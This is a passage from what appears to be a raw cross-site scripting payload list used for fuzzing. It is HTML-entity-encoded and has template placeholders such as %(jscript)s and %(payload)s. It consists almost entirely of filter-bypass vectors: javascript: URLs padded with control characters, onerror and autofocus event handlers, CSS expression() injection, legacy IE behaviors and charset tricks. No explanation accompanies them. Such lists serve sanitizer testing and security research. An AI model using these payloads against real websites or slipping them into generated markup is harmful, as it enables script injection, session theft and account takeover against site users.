id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE1\\x9A\\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x83javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x04javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x01javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x08javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x84javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x86javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE3\\x80\\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x12javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x0Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x0Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x0Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x15javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\xA8javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x16javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x02javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x06javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\xA9javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x80\\x85javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\xE2\\x81\\x9Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\\x1Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\\x00:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\\x3A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\\x09:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\\x0D:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\\x0A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x0Aonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x22onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x0Bonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x0Donerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x2Fonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x09onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x0Conerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x00onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x27onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \\x20onerror=javascript:alert(1)&gt;&quot;`&apos;&gt;&lt;script&gt;\\x3Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x0Djavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xEF\\xBB\\xBFjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x81javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x84javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE3\\x80\\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x09javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x89javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x85javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x88javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x00javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\xA8javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x8Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE1\\x9A\\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x0Cjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x2Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xF0\\x90\\x96\\x9Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x0Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\xAFjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x7Ejavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x87javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x81\\x9Fjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\xA9javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xC2\\x85javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xEF\\xBF\\xAEjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x83javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x8Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xEF\\xBF\\xBEjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x21javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x82javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE2\\x80\\x86javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xE1\\xA0\\x8Ejavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x0Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\x20javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\\xC2\\xA0javascript:alert(1)&lt;/script&gt;&quot;/&gt;&lt;img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x /&gt;&quot;/&gt;&lt;img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x /&gt;&lt;script\\x2F&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x20&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x0D&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x0A&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x0C&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x00&gt;javascript:alert(1)&lt;/script&gt;&lt;script\\x09&gt;javascript:alert(1)&lt;/script&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x0B=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x00=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x0C=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x0D=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x20=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x0A=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x onerror\\x09=javascript:alert(1)&gt;&lt;script&gt;javascript:alert(1)&lt;\\x00/script&gt;&lt;img src=# onerror\\x3D&quot;javascript:alert(1)&quot; &gt;&lt;input onfocus=javascript:alert(1) autofocus&gt;&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;&lt;video poster=javascript:javascript:alert(1)//&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X&lt;video&gt;&lt;source onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;video onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;source&gt;&lt;form&gt;&lt;button formaction=&quot;javascript:javascript:alert(1)&quot;&gt;X&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://google.com&quot; xlink:href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;&lt;frameset onload=javascript:alert(1)&gt;&lt;table background=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//&quot;&gt;&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//&quot;&gt;&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,javascript:alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;&lt;object data=&quot;data:text/html;base64,%(base64)s&quot;&gt;&lt;embed src=&quot;data:text/html;base64,%(base64)s&quot;&gt;&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=javascript:alert(1)//&apos;&gt;&lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;img src=&quot;javascript:alert(1)&quot;&gt;&lt;image src=&quot;javascript:alert(1)&quot;&gt;&lt;script src=&quot;javascript:alert(1)&quot;&gt;&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x&lt;? foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;! foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;/ foo=&quot;&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;&gt;&lt;div id=d&gt;&lt;x xmlns=&quot;&gt;&lt;iframe onload=javascript:alert(1)&quot;&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;&lt;img \\x00src=x onerror=&quot;alert(1)&quot;&gt;&lt;img \\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x12src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x10src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x13src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x32src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img\\x11src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x47src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x34src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x39src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img \\x00src=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x09=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x10=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x13=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x32=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x12=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x11=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x00=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src\\x47=x onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\\x09onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\\x10onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\\x11onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\\x12onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img src=x\\x13onerror=&quot;javascript:alert(1)&quot;&gt;&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;&lt;img src=x onerror=\\x09&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\\x10&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\\x11&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\\x12&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\\x32&quot;javascript:alert(1)&quot;&gt;&lt;img src=x onerror=\\x00&quot;javascript:alert(1)&quot;&gt;&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;&lt;img src=&quot;x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;&quot;` `&gt;&lt;img src onerror /&quot; &apos;&quot;= alt=javascript:alert(1)//&quot;&gt;&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=&quot;`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;&quot;&gt;&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;&lt;script src=&quot;/\\%(jscript)s&quot;&gt;&lt;/script&gt;&lt;script src=&quot;\\\\%(jscript)s&quot;&gt;&lt;/script&gt;&lt;object id=&quot;x&quot; classid=&quot;clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598&quot;&gt;&lt;/object&gt; &lt;object classid=&quot;clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B&quot; onqt_error=&quot;javascript:alert(1)&quot; style=&quot;behavior:url(#x);&quot;&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;&lt;a style=&quot;-o-link:&apos;javascript:javascript:alert(1)&apos;;-o-link-source:current&quot;&gt;X&lt;style&gt;p[foo=bar{}*{-o-link:&apos;javascript:javascript:alert(1)&apos;}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d&lt;style&gt;@import &quot;data:,*%7bx:expression(javascript:alert(1))%7D&quot;;&lt;/style&gt;&lt;a style=&quot;pointer-events:none;position:absolute;&quot;&gt;&lt;a style=&quot;position:absolute;&quot; onclick=&quot;javascript:alert(1);&quot;&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;&lt;style&gt;*[{}@import&apos;%(css)s?]&lt;/style&gt;X&lt;div style=&quot;font-family:&apos;foo&amp;#10;;color:red;&apos;;&quot;&gt;XXX&lt;div style=&quot;font-family:foo}color=red;&quot;&gt;XXX&lt;// style=x:expression\\28javascript:alert(1)\\29&gt;&lt;style&gt;*{x:&#xFF45;&#xFF58;&#xFF50;&#xFF52;&#xFF45;&#xFF53;&#xFF53;&#xFF49;&#xFF4F;&#xFF4E;(javascript:alert(1))}&lt;/style&gt;&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;&lt;div style=&quot;list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));&quot;&gt;X&lt;div id=d&gt;&lt;div style=&quot;font-family:&apos;sans\\27\\3B color\\3Ared\\3B&apos;&quot;&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById(&quot;d&quot;))innerHTML=innerHTML&lt;/script&gt;&lt;div style=&quot;background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);&quot;&gt;X&lt;div style=&quot;font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);&quot;&gt;X&lt;div id=&quot;x&quot;&gt;XXX&lt;/div&gt; &lt;style&gt; #x{font-family:foo[bar;color:green;} #y];color:red;{} &lt;/style&gt;&lt;x style=&quot;background:url(&apos;x&amp;#1;;color:red;/*&apos;)&quot;&gt;XXX&lt;/x&gt;&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;&lt;script&gt;ReferenceError.prototype.__defineGetter__(&apos;name&apos;, function(){javascript:alert(1)}),x&lt;/script&gt;&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._(&apos;javascript:alert(1)&apos;)()&lt;/script&gt;&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi&lt;meta charset=&quot;x-imap4-modified-utf7&quot;&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;&lt;meta charset=&quot;mac-farsi&quot;&gt;&#xBC;script&#xBE;javascript:alert(1)&#xBC;/script&#xBE;X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;&lt;a style=&quot;behavior:url(#default#AnchorClick);&quot; folder=&quot;javascript:javascript:alert(1)&quot;&gt;XXX&lt;/a&gt;&lt;x style=&quot;behavior:url(%(sct)s)&quot;&gt;&lt;xml id=&quot;xss&quot; src=&quot;%(htc)s&quot;&gt;&lt;/xml&gt; &lt;label dataformatas=&quot;html&quot; datasrc=&quot;#xss&quot; datafld=&quot;payload&quot;&gt;&lt;/label&gt;&lt;event-source src=&quot;%(event)s&quot; onload=&quot;javascript:alert(1)&quot;&gt;&lt;a href=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;event-source src=&quot;data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A&quot;&gt;&lt;div id=&quot;x&quot;&gt;x&lt;/div&gt; &lt;xml:namespace prefix=&quot;t&quot;&gt; &lt;import namespace=&quot;t&quot; implementation=&quot;#default#time2&quot;&gt; &lt;t:set attributeName=&quot;innerHTML&quot; targetElement=&quot;x&quot; to=&quot;&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=javascript:alert(1)&amp;gt;&quot;&gt;&lt;script&gt;%(payload)s&lt;/script&gt;&lt;script src=%(jscript)s&gt;&lt;/script&gt;&lt;script language=&apos;javascript&apos; src=&apos;%(jscript)s&apos;&gt;&lt;/script&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;&lt;IMG SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;IMG SRC=javascript:javascript:alert(1)&gt;&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/FRAMESET&gt;&lt;BODY ONLOAD=javascript:alert(1)&gt;&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;&lt;IMG SRC=&quot;jav ascript:javascript:alert(1);&quot;&gt;&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)&gt;&lt;SCRIPT/SRC=&quot;%(jscript)s&quot;&gt;&lt;/SCRIPT&gt;&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;&lt;IMG SRC=&quot;javascript:javascript:alert(1)&quot;&lt;iframe src=%(scriptlet)s &lt;&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;IMG DYNSRC=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;IMG LOWSRC=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;BGSOUND SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;BR SIZE=&quot;&amp;{javascript:alert(1)}&quot;&gt;&lt;LAYER SRC=&quot;%(scriptlet)s&quot;&gt;&lt;/LAYER&gt;&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;STYLE&gt;@import&apos;%(css)s&apos;;&lt;/STYLE&gt;&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;%(css)s&gt;; REL=stylesheet&quot;&gt;&lt;XSS STYLE=&quot;behavior: url(%(htc)s);&quot;&gt;&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:javascript:alert(1)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:javascript:alert(1);&quot;&gt;&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:javascript:alert(1);&quot;&gt;&lt;IFRAME SRC=&quot;javascript:javascript:alert(1);&quot;&gt;&lt;/IFRAME&gt;&lt;TABLE BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;DIV STYLE=&quot;background-image: url(javascript:javascript:alert(1))&quot;&gt;&lt;DIV STYLE=&quot;width:expression(javascript:alert(1));&quot;&gt;&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(javascript:alert(1))&quot;&gt;&lt;XSS STYLE=&quot;xss:expression(javascript:alert(1))&quot;&gt;&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/STYLE&gt;&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:javascript:alert(1)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:javascript:alert(1)&quot;)}&lt;/STYLE&gt;&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;&lt;BASE HREF=&quot;javascript:javascript:alert(1);//&quot;&gt;&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;%(scriptlet)s&quot;&gt;&lt;/OBJECT&gt;&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;&lt;HTML xmlns:xss&gt;&lt;?import namespace=&quot;xss&quot; implementation=&quot;%(htc)s&quot;&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;&quot;&quot;&quot;,&quot;XML namespace.&quot;),(&quot;&quot;&quot;&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&amp;lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:javascript:alert(1)&quot;&amp;gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;&lt;SPAN 